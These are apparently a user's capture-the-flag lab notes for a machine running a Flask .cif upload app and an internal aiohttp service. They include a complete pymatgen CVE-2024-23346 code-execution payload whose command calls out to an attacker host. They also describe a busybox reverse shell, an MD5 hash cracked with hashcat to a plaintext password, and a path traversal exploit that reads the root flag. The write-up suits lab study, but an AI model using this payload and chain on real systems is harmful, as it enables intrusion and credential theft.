80 and 443 closed

5000 open, runs a web interface
    potentially uses flask/werkzeug 3.0.3

    looking at the session cookie after registering:
        .eJwljjEOwzAIAP_iuQMYsHE-E5kCalenmar-vZFy091237LniuNVts8641H2t5et4MDZKQwVBb1WNe7aAbAFQKvRgVr2MZ-JdjmjaB3qICgxvTFQkrFnNUpBsjRi4HZnkl606dPmdGCVHnWIYB-sSExu5Ro5j1j3DUH5_QEsKC13.Zx-eNQ.UxJ5EFLpihqO85ycKkM8sFS6T7E
    it is indeed generated by flask (itsdangerous library)

    file uploading feature (POST /upload) redirects to GET /upload
    uploading a non-cif file gives an error
    uploading a .cif file with nonsense uploads fine but gives 500 on GET /structure/id (trying to view)

    delete endpoint is http://10.10.11.38:5000/delete_structure/id

    so the point is apparently to somehow include a python payload in a .cif file and then run it when pressing view

    this payload works (https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure)

    payload.cif
        data_5yOhtAoR
        _audit_creation_date            2018-06-08
        _audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

        loop_
        _parent_propagation_vector.id
        _parent_propagation_vector.kxkykz
        k1 [0 0 0]

        _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl 10.10.16.45:4000");0,0,0'


        _space_group_magn.number_BNS  62.448
        _space_group_magn.name_BNS  "P  n'  m  a'  "


    revshells didn't work until blindly trying the busybox one

    after getting the shell we are user app, there's user rosa in /home and database.db in /home/app/instance
    hosting a python server and grabbing the file we get the password hash to (potentially) the linux user

    63ed86ee9f624c7b14f1d4f43dc251a5, which is an md5 hash

    hashcat -m 0 -a 0 phash.txt ~/wordlists/rockyou.txt -> unicorniosrosados

    ssh to user rosa with this password works and gives user flag

    running linpeas the only interesting thing we find is the ports

        tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
        tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
        tcp        0      0 10.10.11.38:8000        0.0.0.0:*               LISTEN      -
        tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
        tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
        tcp6       0      0 :::22                   :::*                    LISTEN      -

    8000 is our python file server
    5000 is the app
    8080 looks like an internal monitoring util (after running curl)

    ssh -L 8080:localhost:8080 rosa@10.10.11.38 to forward the port

    nothing in the app is interactive

    headers return aiohttp/3.9.1

    this is vulnerable to https://github.com/wizarddos/CVE-2024-23334

    passing -d /assets (as static doesn't exist), -f /root/root.txt gives root flag

    gg









